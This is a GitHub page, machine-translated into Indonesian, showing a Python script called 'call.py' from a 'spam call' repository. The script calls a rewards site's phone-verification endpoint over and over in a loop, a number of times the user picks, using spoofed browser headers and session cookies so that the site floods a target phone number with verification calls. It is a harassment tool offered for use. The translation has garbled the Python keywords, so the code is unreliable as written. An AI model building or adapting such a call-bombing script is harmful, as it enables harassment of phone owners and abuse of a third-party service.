@@ -1,0 +1,122 @@
+Lewati ke konten
+ceritaku
+/
+panggilan spam
+Publik
+Kode
+Masalah
+1
+Tarik permintaan
+tindakan
+Proyek
+Wiki
+Keamanan
+Wawasan
+panggilan spam/ call.py
+@storiku
+storiku Perbarui call.py
+ 1 kontributor
+90 baris (61 sloc)  2.79 KB
+impor  os , sys , waktu
+ permintaan impor
+ subproses impor
+dari  permintaan  pos impor 
+
+URL VARIABEL #MASUKAN NOMOR DI KOLOM
+#MASUKAN NOMOR TANPA 62/0
+#CONTOH 8938373772
+url  =  "https://id.jagreward.com/member/verify-mobile/85695696808/"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+bersih  bersih ():
+    os . sistem ( "jelas" )
+
+def  balik ():
+    d  =  input ( " \033 [1;97mCoba lagi? (y/t): " )
+    jika  d  ==  "y" :
+       subproses . panggilan ( "python call.py" , shell = True )
+    elif  d  ==  "t" :
+         print ( " \033 [1;91mKeluar" )
+         os . sistem ( "keluar" )
+bersih ()
+subproses . panggilan ( "figlet SpamCall |lolcat" , shell = True )
+spanduk  =  """
+\033 [1;97m
+==================================================
+Perekam   \033 [1;91m: \033 [1;96mAyipBontos \033 [1;97m]
+Situs web \033 [1;91m: \033 [1;96mhttps://termux.id \033 [1;97m
+Whatsapp   \033 [1;91m: \033 [1;92m+6282278198xxx \033 [1;97m]
+==================================================
+"""
+cetak ( spanduk )
+jm  =  int ( input ( " \033 [1;97m[ \033 [1;96 1000 \033 [1;97m]: \033 [1;93m" )")
+waktu . tidur ( 2 )
+subproses . panggilan ( "nano call.py" , shell = True )
+print ( " \033 [1;92mMemuat \033 [1;97m..." )
+waktu . tidur ( 2 )
+kepala  = {
+"X-Diminta-Dengan" : "XMLHttpRequest" ,
+"User-Agent" : "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36" ,
+"Content-Type" : " application/x-www-form-urlencoded; charset=UTF-8" ,
+"Content-Type" : "application/json" ,
+"Asal" : "https://id.jagreward.com" ,
+"Referer" : "https://id.jagreward.com/member/register/" ,
+"Accept-Encoding" : "gzip, deflate, br" ,
+"Accept-Language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" ,
+"__cfduid" : "d4de1e7ea2ced09ecde54a568af1ac50b1584709816" ,
+"_ga" : "GA1.2.2037151396.1584709855" ,
+"PHPSESSID" : "n88pmtvvsdpf25898a9jeqbggc" ,
+"DAPROPS" : "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRasio:1,75 |idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1 |bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs .sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSocket:1|bjs.webSqlDatabase :1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0" ,
+}
+saudara  = {
+"metode" : "PANGGILAN" ,
+"kode negara" : "id" ,
+}
+def  kirim ():
+    coba :
+        untuk  saya  dalam  jangkauan ( jm ):
+            r  =  permintaan . dapatkan ( url , data = bro , header = head )
+            print ( " \033 [1;97m[ \033 [1;96mResult \033 [1;97m: \033 [1;93m" , r . json ()[ "hasil" ], " \033 [1;97m[ \033 [1 ; 96mStatus \033 [1;97m]: \033 [1;93m" , r .json ()[ "pesan" ])
+            waktu . tidur ( 3 )
+    kecuali  KeyboardInterrupt :
+            print ( " \033 [1;91mStop!!" )
+kirim ()
+balik ()
+© 2022 GitHub, Inc.
+Ketentuan
+Pribadi
+Keamanan
+Status
+dokumen
+Hubungi GitHub
+harga
+API
+Pelatihan
+Blog
+Tentang
+Pemuatan selesai
